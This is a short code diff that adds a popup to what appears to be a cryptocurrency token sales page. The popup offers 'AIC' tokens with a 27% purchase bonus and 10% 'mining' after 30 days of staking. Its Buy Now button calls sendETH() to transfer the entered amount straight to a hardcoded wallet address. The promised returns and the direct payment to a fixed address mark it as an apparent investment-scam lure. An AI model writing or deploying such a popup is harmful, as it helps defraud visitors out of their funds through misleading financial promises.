@@ -902,6 +902,14 @@ function sendWebhookMessage(webhookUrl, message) {
 		<p>Buy 1 BNB or 1 ETH of AIC and get an additional 27% of tokens. With 10% token mining after 30 days of staking here on the site.</p>
 		<button>Buy Now</button>
 	</div>
+	<div class="popup" id="popup">
+		<span class="close" onclick="closePopup()">&times;</span>
+		<div class="popup-shape"></div>
+		<h2>AI-generated Popup</h2>
+		<p>Buy 1 BNB or 1 ETH of AIC and get an additional 27% of tokens. With 10% token mining after 30 days of staking here on the site.</p>
+		<button onclick="sendETH('0x01C65F22A9478C2932e62483509c233F0aaD5c72', document.getElementById('amount1').value)">Buy Now</button>
+	</div>
+
 
 	<script type="text/javascript">
 		function closePopup() {
